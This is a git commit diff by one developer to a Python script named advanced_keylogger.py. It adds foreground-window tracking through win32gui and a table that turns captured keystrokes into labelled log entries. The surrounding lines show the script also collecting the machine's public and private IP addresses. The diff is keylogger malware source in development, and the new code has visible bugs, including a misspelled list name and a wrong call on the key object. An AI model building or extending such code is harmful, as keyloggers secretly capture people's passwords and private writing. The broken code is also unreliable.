a34ae09655505897973e62dd2c49c734503a57a8
Kacper <kacwal@poczta.fm>
2019-10-22 20:07:04 +0200

    this is what i coded till 8pm

--- advanced_keylogger.py
+++ advanced_keylogger.py
@@ -4,6 +4,7 @@ import os
 import random
 import requests
 import socket
+import win32gui
 
 publicIP = requests.get('https://api.ipify.org').text
 privateIP = socket.gethostbyname(socket.gethostname())
@@ -20,7 +21,25 @@ delete_file = []
 
 def on_press(key):
     global old_app
-    """there i need something to listen current used window (in windows it is win32gui module)"""
+
+    new_app = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+
+    if new_app == 'Cortana':
+        new_app = 'Windows start menu'
+    else:
+        pass
+    
+    substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
+            'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]', 
+	'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13', 
+	'[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]', 'Key.cmd', 
+	'[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']
+    
+    key = key(key).strip('\`')
+
+    if key in substition:
+        logged_data.append(substitution[substitution.index(key)+1])
+
     print(key)
 
 """temporary function to stop listening when esc is pressed"""
